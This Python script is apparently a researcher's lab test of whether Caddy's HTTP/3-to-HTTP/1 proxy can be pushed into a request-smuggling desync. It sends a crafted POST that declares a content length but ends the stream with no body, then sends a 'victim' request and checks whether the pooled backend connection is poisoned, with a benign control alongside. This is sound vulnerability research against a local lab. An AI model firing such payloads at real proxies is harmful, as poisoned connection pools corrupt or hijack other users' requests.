"""Decisive exploitability test for the Caddy(quic-go) H3->H1 standalone-FIN signal.
The tap shows CL>delivered, but that is only exploitable if Caddy POOLS the desynced
backend connection. Test: fire malicious standalone-FIN (CL:N,0 body) then a VICTIM
request; if the backend frames the victim's first N bytes as the malicious body (victim
request-line corrupted), the pool is poisoned = REAL desync. If both frame cleanly,
Caddy closed the conn = non-exploitable. Reproducibility + benign control included."""
import asyncio, json, os, ssl, sys, time
sys.path.insert(0, "/home/j4kuuu/Desktop/tools/QuicDrawH3/src")
from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.quic.configuration import QuicConfiguration
from phage.evo import genome as G
from phage.evo.driver import drive

ECHO = "logs/echo_caddy.jsonl"
TAP = "logs/tap_cb.jsonl"


def size(p):
    try: return os.path.getsize(p)
    except OSError: return 0


async def fire(genome):
    cfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    cfg.verify_mode = ssl.CERT_NONE
    async with connect("127.0.0.1", 4437, configuration=cfg) as c:
        http = H3Connection(c._quic)
        sid = c._quic.get_next_available_stream_id()
        await drive(http, c._quic, sid, genome, transmit=c.transmit, raw=True)
        await asyncio.sleep(0.3)


def fire_sync(g):
    try: asyncio.new_event_loop().run_until_complete(fire(g))
    except Exception: pass


def recs(off):
    with open(ECHO, "rb") as f:
        f.seek(off); data = f.read()
    out = []
    for line in data.split(b"\n"):
        if line.strip():
            try: out.append(json.loads(line))
            except Exception: out.append({"raw": line.decode("latin1", "replace")})
    return out


def mal(cl=44):
    return [G.Headers(((b":method", b"POST"), (b":scheme", b"https"), (b":authority", b"lab"),
                       (b":path", b"/evil"), (b"content-length", str(cl).encode())), end_stream=False),
            G.Fin()]


def victim():
    return [G.Headers(((b":method", b"GET"), (b":scheme", b"https"), (b":authority", b"lab"),
                       (b":path", b"/VICTIM_MARKER_ZZZZZZZZ")), end_stream=True)]


print("=== reproducibility: standalone-FIN CL=10, x3 (tap CL vs body) ===")
CRLF = b"\r\n"
for i in range(3):
    off = size(TAP)
    fire_sync(mal(10))
    time.sleep(0.4)
    with open(TAP, "rb") as f:
        f.seek(off); fwd = f.read()
    head, _, body = fwd.partition(CRLF + CRLF)
    cl = next((int(l.split(b":", 1)[1]) for l in head.split(CRLF) if l.lower().startswith(b"content-length")), None)
    print(f"  run{i}: fwd CL={cl} body={len(body)}")

print("\n=== EXPLOITABILITY: malicious standalone-FIN then victim (pool poisoned?) ===")
off = size(ECHO)
fire_sync(mal(44))
time.sleep(0.4)
fire_sync(victim())
time.sleep(0.6)
r = recs(off)
print(f"  backend framed {len(r)} record(s):")
for x in r:
    print(f"    {x}")
clean = any(rr.get("boundaries") and any(b[0] == "GET" and "VICTIM_MARKER" in str(b[1]) for b in rr["boundaries"]) for rr in r)
print(f"  victim framed cleanly as its own GET /VICTIM_MARKER? {clean}")
if clean:
    print("  => Caddy did NOT poison the pool (conn closed after mismatch). NON-EXPLOITABLE tap artifact.")
else:
    print("  => *** victim corrupted: POOL POISONED = real H3->H1 desync ***")

print("\n=== negative control: benign POST CL=4 then victim (must be clean) ===")
off = size(ECHO)
fire_sync([G.Headers(((b":method", b"POST"), (b":scheme", b"https"), (b":authority", b"lab"),
                      (b":path", b"/ok"), (b"content-length", b"4")), end_stream=False), G.Data(b"AAAA", end_stream=True)])
time.sleep(0.3)
fire_sync(victim())
time.sleep(0.6)
for x in recs(off):
    print(f"    {x}")
